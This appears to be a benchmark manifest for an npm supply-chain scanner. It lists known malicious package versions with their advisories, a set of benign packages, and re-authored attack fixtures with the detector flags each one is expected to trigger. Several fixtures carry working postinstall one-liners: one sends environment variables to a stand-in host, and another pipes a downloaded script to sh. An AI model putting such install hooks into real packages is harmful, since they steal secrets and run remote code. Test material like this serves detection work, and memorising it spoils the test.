@@ -1,0 +1,114 @@
+{
+  "$schema": "No formal schema — this file is consumed by benchmark/run.mjs",
+  "safetyPolicy": "Nothing in this manifest is malware and nothing here downloads malware. Part A pins historical malicious VERSIONS in lockfiles (text only — vexes flags them from OSV advisories, no package is fetched). Part B fixtures are techniques re-authored by us as inert source strings analyzed in-process. Part C downloads only well-known benign packages. No package code is ever executed in any part.",
+  "knownBad": [
+    {
+      "name": "event-stream",
+      "version": "3.3.6",
+      "incident": "2018-11",
+      "advisory": "GHSA-mh6f-8j2x-4483",
+      "summary": "Backdoored release exfiltrated Bitcoin wallet secrets via an obfuscated dependency chain"
+    },
+    {
+      "name": "ua-parser-js",
+      "version": "0.7.29",
+      "incident": "2021-10",
+      "advisory": "GHSA-pjwm-rvh2-c87w",
+      "summary": "Hijacked release dropped a credential stealer and cryptominer"
+    },
+    {
+      "name": "coa",
+      "version": "2.0.3",
+      "incident": "2021-11",
+      "advisory": "GHSA-73qr-pfmq-6rp8",
+      "summary": "Hijacked release exfiltrated credentials from install scripts"
+    },
+    {
+      "name": "node-ipc",
+      "version": "11.3.0",
+      "incident": "2022-03",
+      "advisory": "GHSA-3mpp-xfvh-qh37",
+      "summary": "ProTest: pulled in peacenotwar, which overwrote files on affected systems"
+    },
+    {
+      "name": "crossenv",
+      "version": "0.0.8",
+      "incident": "2017-08",
+      "advisory": "GHSA-c2m4-w5hm-vqjw",
+      "summary": "Typosquat of cross-env; postinstall exfiltrated environment variables"
+    }
+  ],
+  "techniques": [
+    {
+      "id": "env-exfil-postinstall",
+      "technique": "postinstall reads environment variables and POSTs them to a remote host",
+      "name": "totally-normal-utils",
+      "scripts": {
+        "postinstall": "node -e \"const h=require('https');const p=JSON.stringify(process.env);h.request({hostname:'collector.example.invalid',path:'/e',method:'POST'},()=>{}).end(p)\""
+      },
+      "previousInstallScripts": null,
+      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+    },
+    {
+      "id": "downloader-postinstall",
+      "technique": "postinstall downloads and runs a remote script via child_process",
+      "name": "fast-build-helper",
+      "scripts": {
+        "postinstall": "node -e \"require('child_process').exec('curl -s http://cdn.example.invalid/i.sh | sh')\""
+      },
+      "previousInstallScripts": null,
+      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+    },
+    {
+      "id": "obfuscated-payload",
+      "technique": "base64-decoded payload handed to eval at install time",
+      "name": "skinny-license",
+      "scripts": {
+        "postinstall": "node -e \"eval(Buffer.from('aGVsbG8gZnJvbSB0aGUgcGF5bG9hZA==','base64').toString())\""
+      },
+      "previousInstallScripts": null,
+      "expectAnyOf": ["POSTINSTALL_SCRIPT", "AST_DANGEROUS_PATTERN", "INITIAL_DANGEROUS_CAPABILITY"]
+    },
+    {
+      "id": "capability-escalation",
+      "technique": "clean previous version, first-ever network-capable install script in the new one",
+      "name": "quiet-widget",
+      "scripts": {
+        "postinstall": "node -e \"require('https').get('https://metrics.example.invalid/ping')\""
+      },
+      "previousInstallScripts": {},
+      "expectAnyOf": ["CAPABILITY_ESCALATION"]
+    },
+    {
+      "id": "typosquat-name",
+      "technique": "package name one edit-distance from a popular package",
+      "name": "expres",
+      "scripts": {},
+      "previousInstallScripts": null,
+      "expectAnyOf": ["TYPOSQUAT"]
+    },
+    {
+      "id": "clean-build-script",
+      "technique": "false-positive check: benign inline build verification",
+      "name": "honest-widget",
+      "scripts": {
+        "postinstall": "node -e \"require('./lib/verify.js').check()\""
+      },
+      "previousInstallScripts": {},
+      "expectAnyOf": [],
+      "expectNone": ["AST_DANGEROUS_PATTERN"]
+    }
+  ],
+  "benignLive": [
+    { "name": "lodash", "note": "no lifecycle scripts" },
+    { "name": "express", "note": "no lifecycle scripts" },
+    { "name": "chalk", "note": "no lifecycle scripts" },
+    { "name": "ms", "note": "tiny utility" },
+    { "name": "debug", "note": "tiny utility" },
+    { "name": "semver", "note": "no lifecycle scripts" },
+    { "name": "typescript", "note": "large but script-free" },
+    { "name": "esbuild", "note": "HAS postinstall — deliberate FP stressor (platform binary bootstrap)" },
+    { "name": "react", "note": "no lifecycle scripts" },
+    { "name": "axios", "note": "no lifecycle scripts" }
+  ]
+}
